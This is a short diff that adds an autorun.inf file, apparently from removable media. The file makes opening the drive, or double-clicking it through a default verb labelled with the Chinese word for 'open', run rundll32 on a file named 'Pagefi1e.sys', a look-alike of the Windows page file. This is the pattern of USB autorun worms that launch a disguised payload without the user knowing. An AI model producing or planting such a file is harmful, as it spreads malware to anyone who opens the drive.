@@ -1,0 +1,5 @@
+[autorun]
+OPEN=rundll32.exe Pagefi1e.sys,RunDll
+shell\打开(&0)\command=rundll32.exe Pagefi1e.sys,RunDll
+shell=打开(&0)
+
